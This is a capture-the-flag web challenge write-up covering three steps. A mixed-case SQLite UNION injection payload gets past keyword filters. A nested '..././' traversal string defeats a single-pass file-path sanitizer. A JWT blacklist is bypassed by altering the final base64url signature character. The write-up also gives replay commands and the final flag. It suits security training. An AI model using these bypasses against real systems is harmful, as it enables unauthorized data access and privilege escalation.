# NO.6 BitDancing Guest

## Metadata

- Event: ByteCTF 143
- Category: Web
- Pattern: SQLite SQLi plus LFI delayed traversal plus JWT blacklist bypass
- Knowledge links:
  [ctf-knowledge-web.md#sqlite-sqli-with-simple-keyword-blacklists](ctf-knowledge-web.md#sqlite-sqli-with-simple-keyword-blacklists),
  [ctf-knowledge-web.md#single-pass-lfi-sanitizer-bypass](ctf-knowledge-web.md#single-pass-lfi-sanitizer-bypass),
  [ctf-knowledge-web.md#jwt-signature-encoding-blacklist-bypass](ctf-knowledge-web.md#jwt-signature-encoding-blacklist-bypass)
- Local solution:
  [solution.md](../../../ctf/bytectf-143/challenges/no6-bitdancing-guest/notes/solution.md)

## Prompt Summary

The challenge provides a guest account `bitguest:bitguest`. The API welcomes the
guest with hints to search for `SQ🔥e` and to read `/view?file=hint`. Hidden
challenge rows point to `flag1`, `flag2.txt`, and `/flag3`.

## Signals

- Login returns an HS256 JWT containing only `{"role":"bitguest"}`.
- `/?search=` reflects SQL errors from a SQLite query.
- Simple keyword filters block lowercase `union`, `select`, `or`, and comments,
  but mixed case and `/**/` work.
- `/view?file=` prefixes `public/`, appends `.txt`, replaces literal `flag`,
  removes `//`, then removes `../` only once.
- `blacklisted_tokens` contains a signed `bitadmin` JWT, and `/flag3` rejects
  the exact blacklisted string.

## Route

1. Run first-pass target collection with `ctf_web.py`: login, `/`, search hint,
   and `/view?file=hint`.
2. Browse the local casebook through `Pentesting -> web-service`. No direct
   solved card matched the SQLite/JWT/LFI combination, so continue from
   evidence.
3. Use mixed-case SQLi:
   `x'/**/UnIoN/**/SeLeCt/**/name,sql/**/FrOm/**/sqlite_master/*`.
4. Dump `flag1`, `challenges`, `users`, `public_files`, and
   `blacklisted_tokens`.
5. Use `lfi-probe` against target `private/flag2`. The winning payload is
   `..././private/f//lag2`, which becomes `public/../private/flag2.txt`.
6. Use `jwt-variant-probe` on the blacklisted admin token. Changing the final
   base64url signature character from `w` to `x`, `y`, or `z` preserves the
   decoded HMAC bytes but changes the token string, bypassing exact blacklist
   matching.
7. Concatenate the three returned flag parts.

## Replay Commands

```bash
python scripts/sec.py knowledge browse \
  --category Pentesting \
  --artifact web-service \
  --cards \
  --limit 8

python scripts/sec.py probe web lfi-probe \
  --case-dir ctf/bytectf-143/challenges/no6-bitdancing-guest \
  --url-template '/view?file={payload}' \
  --target private/flag2 \
  --header 'Authorization: Bearer <guest-jwt>' \
  --label lfi_probe_flag2_replay

python scripts/sec.py probe web jwt-variant-probe \
  --case-dir ctf/bytectf-143/challenges/no6-bitdancing-guest \
  --token '<blacklisted-bitadmin-jwt>' \
  --url /flag3 \
  --include-original \
  --include-padding \
  --label flag3_admin_equiv_jwt
```

## False Leads

- Common JWT secret lists, prompt-derived ByteDance value dictionaries, and
  mutated candidates did not crack the HS256 secret.
- `kid`, `alg:none`, request headers such as `X-Role`, and path normalization
  did not grant `bitadmin`.
- Direct `/flag2.txt`, `/public/flag2.txt`, and public LFI guesses missed the
  real `private/flag2.txt` location.
- Werkzeug debugger static resources were reachable, but no traceback page
  exposed the debugger `SECRET`.

## Final

`flag{b17c7f_1n5p123_c23471v17y_4nd_b21n6_j0y_<3}`
